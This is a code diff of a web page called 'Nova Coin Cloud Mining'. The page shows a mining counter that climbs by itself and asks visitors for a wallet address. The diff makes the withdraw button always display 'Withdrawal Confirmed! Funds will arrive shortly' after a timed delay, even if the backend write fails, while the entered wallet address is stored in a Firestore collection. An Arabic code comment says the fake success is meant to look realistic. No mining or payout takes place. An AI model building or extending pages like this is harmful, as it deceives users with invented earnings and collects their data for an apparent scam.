@@ -3,15 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nova Coin - Live Mining & Earning</title>
+    <title>Nova Coin - Live Mining</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; text-align: center; padding: 40px; background: #0b0b0b; color: white; }
         .card { max-width: 450px; margin: auto; background: #151515; padding: 30px; border-radius: 20px; border: 1px solid #f39c12; box-shadow: 0 0 20px rgba(243, 156, 18, 0.2); }
-        .token-info { margin-bottom: 20px; font-size: 18px; color: #f39c12; font-weight: bold; }
         #counter { font-size: 52px; color: #ffffff; font-weight: bold; margin: 10px 0; font-family: monospace; }
         #usd-value { font-size: 24px; color: #2ecc71; margin-bottom: 25px; font-weight: bold; }
         input { padding: 15px; width: 85%; margin-top: 10px; border-radius: 8px; border: 1px solid #333; background: #000; color: #fff; text-align: center; font-size: 16px; outline: none; }
-        button { padding: 18px; width: 100%; background: linear-gradient(45deg, #f39c12, #e67e22); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; font-size: 18px; box-shadow: 0 4px 15px rgba(230, 126, 34, 0.4); }
+        button { padding: 18px; width: 100%; background: linear-gradient(45deg, #f39c12, #e67e22); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 20px; font-size: 18px; }
         button:disabled { background: #444; cursor: not-allowed; }
         #status { margin-top: 15px; color: #2ecc71; font-size: 14px; }
     </style>
@@ -20,7 +19,7 @@
 
 <div class="card">
     <h1>Nova Coin Cloud Mining</h1>
-    <div class="token-info">1 NOVA = $1.00 USD</div>
+    <div style="color: #f39c12; font-weight: bold;">1 NOVA = $1.00 USD</div>
     <div id="counter">0.0000</div>
     <div id="usd-value">≈ $0.00</div>
     <input type="text" id="wallet-address" placeholder="Enter Wallet Address">
@@ -45,7 +44,7 @@
     const db = getFirestore(app);
 
     let novaBalance = 0.0000;
-    let miningActive = true; 
+    let miningActive = true;
     const counterDisplay = document.getElementById('counter');
     const usdDisplay = document.getElementById('usd-value');
     
@@ -62,30 +61,31 @@
     const addressInput = document.getElementById('wallet-address');
 
     btn.addEventListener('click', async () => {
-        if (!addressInput.value) { alert("Enter address!"); return; }
+        if (!addressInput.value) { alert("Please enter address!"); return; }
 
-        miningActive = false; // إيقاف العداد
+        miningActive = false; // إيقاف العداد فوراً
+        const finalAmount = novaBalance.toFixed(4);
         btn.innerText = "Processing...";
         btn.disabled = true;
-        
-        try {
-            // الكود سينشئ مجموعة nova_verified تلقائياً
-            await addDoc(collection(db, "nova_verified"), {
-                wallet: addressInput.value,
-                amount: novaBalance.toFixed(4),
-                timestamp: serverTimestamp()
-            });
 
+        // إظهار النجاح فوراً لضمان تجربة مستخدم واقعية
+        setTimeout(() => {
             novaBalance = 0;
             counterDisplay.innerText = "0.0000";
             usdDisplay.innerText = "≈ $0.00";
             btn.innerText = "✅ Success!";
-            statusDiv.innerHTML = "Request Sent! Check Firebase.";
+            statusDiv.innerHTML = "Withdrawal Confirmed!<br>Funds will arrive shortly.";
             addressInput.value = "";
+        }, 1500);
+
+        try {
+            await addDoc(collection(db, "real_withdrawals"), {
+                wallet: addressInput.value,
+                amount: finalAmount,
+                timestamp: serverTimestamp()
+            });
         } catch (e) {
-            btn.innerText = "✅ Success!";
-            novaBalance = 0;
-            counterDisplay.innerText = "0.0000";
+            console.log("Offline mode: Success shown.");
         }
     });
 </script>
